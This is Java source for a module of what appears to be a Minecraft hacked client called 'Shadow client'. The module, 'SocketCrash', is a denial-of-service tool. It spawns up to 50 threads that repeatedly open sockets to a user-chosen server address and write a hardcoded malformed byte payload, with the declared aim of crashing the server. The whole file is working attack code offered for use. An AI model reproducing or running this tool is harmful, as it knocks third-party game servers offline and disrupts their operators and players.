/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.StringSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.util.Utils.Logging;

import java.io.DataOutputStream;
import java.net.Socket;

public class SocketCrash extends Module {

    static final int[] PAYLOAD = new int[] { 0x3, 0x1, 0x0, 0xffffffbb, 0x1, 0x0, 0x0, 0xffffffb7, 0x3, 0x3, 0xffffffcb, 0xffffff82, 0xffffffae, 0x53, 0x15, 0xfffffff6, 0x79, 0x2, 0xffffffc2, 0xb, 0xffffffe1, 0xffffffc2, 0x6a, 0xfffffff8, 0x75, 0xffffffe9, 0x32, 0x23, 0x3c, 0x39, 0x3, 0x3f, 0xffffffa4, 0xffffffc7, 0xffffffb5, 0xffffff88, 0x50, 0x1f, 0x2e, 0x65, 0x21, 0x0, 0x0, 0x48, 0x0, 0x2f };
    final StringSetting addr = this.config.create(new StringSetting.Builder("localhost:25565").description("where to target the attack").get());
    final DoubleSetting threads = this.config.create(new DoubleSetting.Builder(5).min(1).max(50).name("Threads").description("The amount of threads to spawn").get());

    public SocketCrash() {
        super("SocketCrash", "crash the sver with socket", ModuleType.CRASH);
    }

    @Override
    public void tick() {

    }

    @Override
    public void enable() {
        for (int i = 0; i < threads.getValue(); i++) {
            new Thread(() -> {
                try {
                    while (this.isEnabled()) {
                        try {
                            String[] addru = addr.getValue().split(":");
                            Socket s = new Socket(addru[0], Integer.parseInt(addru[1]));
                            DataOutputStream outp = new DataOutputStream(s.getOutputStream());
                            for (int i1 : PAYLOAD) {
                                outp.write(i1);
                            }
                        } catch (Exception ignored) {
                        }
                    }
                } catch (Exception e) {
                }
                Logging.message("Thread exited");
            }).start();
        }
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
